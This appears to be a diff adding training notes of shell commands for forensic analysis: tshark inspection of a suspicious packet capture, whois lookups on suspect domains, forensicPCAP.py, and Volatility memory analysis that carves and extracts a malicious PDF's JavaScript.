+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+
+sudo tshark -i eth0 -r suspicious-time.pcap -qz io,phs   
+
+
+for i in session_00[0-9]*.www.html; do srcip=`cat "$i" | grep 'www:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'www:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+
+
+
+
+
+#############################
+# PCAP Analysis with tshark #
+#############################
+tshark -r suspicious-time.pcap | grep 'NB.*20\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+
+
+tshark -r suspicious-time.pcap | grep 'NB.*1e\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+
+
+tshark -r suspicious-time.pcap arp | grep has | awk '{print $3," -> ",$9}' | tr -d '?'
+
+
+tshark –r suspicious-time.pcap -Tfields -e “eth.src” | sort | uniq
+
+
+tshark -r suspicious-time.pcap -R "browser.command==1" -Tfields -e "ip.src" -e "browser.server" | uniq
+
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort |uniq
+
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+
+tshark -r suspicious-time.pcap -R "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+
+tshark -r suspicious-time.pcap -R "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+
+
+whois rapidshare.com.eyu32.ru
+
+whois sploitme.com.cn
+
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' 
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+
+tshark -r suspicious-time.pcap -qz http_req,tree
+
+tshark -r suspicious-time.pcap -R "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+
+
+
+######################################
+# PCAP Analysis with forensicPCAP.py #
+######################################
+cd ~/Desktop
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+sudo easy_install cmd2
+
+python forensicPCAP.py Browser\ Forensics/suspicious-time.pcap
+
+ForPCAP >>> help
+
+
+Prints stats about PCAP
+ForPCAP >>> stat
+
+
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dns
+
+ForPCAP >>> show
+
+
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dstports
+
+ForPCAP >>> show
+
+
+Prints the number of ip source and store them.
+ForPCAP >>> ipsrc
+
+
+Prints the number of web's requests and store them
+ForPCAP >>> web
+
+
+Prints the number of mail's requests and store them
+ForPCAP >>> mail
+
+
+
+###################
+# Memory Analysis #
+###################
+cd /home/malware/Desktop/Banking\ Troubles/Volatility
+
+python volatility
+python volatility pslist -f ../hn_forensics.vmem
+python volatility connscan2 -f ../hn_forensics.vmem
+python volatility memdmp -p 888 -f ../hn_forensics.vmem
+python volatility memdmp -p 1752 -f ../hn_forensics.vmem
+				***Takes a few min***
+strings 1752.dmp | grep "^http://" | sort | uniq
+strings 1752.dmp | grep "Ahttps://" | uniq -u
+cd ..
+foremost -i ../Volatility/1752.dmp -t pdf -o output/pdf2
+cd /home/malware/Desktop/Banking\ Troubles/foremost-1.5.7/output/pdf2/
+cat audit.txt
+cd pdf
+ls
+grep -i javascript *.pdf
+
+
+
+cd /home/malware/Desktop/Banking\ Troubles/foremost-1.5.7/output/pdf5/pdf
+wget http://didierstevens.com/files/software/pdf-parser_V0_6_4.zip
+unzip pdf-parser_V0_6_4.zip
+python pdf-parser.py -s javascript --raw 00600328.pdf
+python pdf-parser.py --object 11 00600328.pdf
+python pdf-parser.py --object 1054 --raw --filter 00600328.pdf > malicious.js
+
+cat malicious.js
+
+
+*****Sorry - no time to cover javascript de-obfuscation today*****
+
+
+cd /home/malware/Desktop/Banking\ Troubles/Volatility/
+python volatility files -f ../hn_forensics.vmem > files
+cat files | less
+python volatility malfind -f ../hn_forensics.vmem -d out
+ls out/
+python volatility hivescan -f ../hn_forensics.vmem									
+python volatility printkey -o 0xe1526748 -f ../hn_forensics.vmem Microsoft "Windows NT" CurrentVersion Winlogon	
+for file in $(ls *.dmp); do echo $file; strings $file | grep bankofamerica; done
